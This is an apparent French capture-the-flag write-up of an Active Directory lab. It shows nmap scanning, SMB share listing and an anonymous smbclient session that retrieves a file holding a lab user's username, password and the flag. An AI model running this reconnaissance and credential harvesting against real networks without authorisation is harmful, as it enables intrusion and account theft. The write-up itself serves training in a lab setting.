Chall 1 AD :

```bash
nmap -sC -sV 192.168.1.1 192.168.1.10 192.168.1.11 
```
Scan de l'environnement LAB j'ai ces 3 machines dispo il faut ducoup les analyser pour trouver qui est le DC


on vois donc : 
192.168.1.1 - MH-DC01 il a tout les services actifs d'un AD DS / DNS il porte le domaine MH.LOCAL

192.168.1.10 - MH-CLI1
192.168.1.11 - MH-CLI2

On liste les partages du serveur :
```
smbclient -L //192.168.1.1

ADMIN$ Disk Administration à distance 
C$ Disk Partage par défaut 
FLAGCHALL4 Disk 
FLAGCHALL5 Disk 
IPC$ IPC IPC distant 
NETLOGON Disk Partage de serveur d'accès 
Partage_Temp Disk 
SYSVOL Disk Partage de serveur d'accès 

Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 192.168.1.1 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available
```


on vois donc " partage TEMP " 


```
smbclient //192.168.1.1/Partage_Temp -N
```

Donc la une fois connecté au partage en Anonyme on peut lister les fichiers et on vois 
"flag.txt "


```
smbclient //192.168.1.1/Partage_Temp -N 
Try "help" to get a list of possible commands. 

smb: \> ls . 
creds_j_peuplu.txt A 281 Wed Jan 28 14:10:42 2026 15522047 blocks of size 4096. 
13160572 blocks available 

smb: \> cat creds_j_peuplu.txt cat: command not found 
smb: \> recurse on 
smb: \> prompt off 
smb: \> mget * getting file \creds_j_peuplu.txt of size 281 as creds_j_peuplu.txt (1,2 KiloBytes/sec) (average 1,2 KiloBytes/sec) 
smb: \> ls . 
creds_j_peuplu.txt A 281 Wed Jan 28 14:10:42 2026 15522047 blocks of size 4096. 13160567 blocks available 

smb: \> exit 

cat creds_j_peuplu.txt 

Salut Jean ! Voici tes identifiants : username : MH\j.peuplu mot de passe : 6fhQ6B8Fg Bonne arrivée parmi nous ! N'oublie pas de changer ton mot de passe lors de ta première connexion Cordialement, Ton nouvel admin préféré fl@g{An0nym0ùsL0g0n3xp0s3d}
```


Et voila le premier FLAG AD :slight_smile:
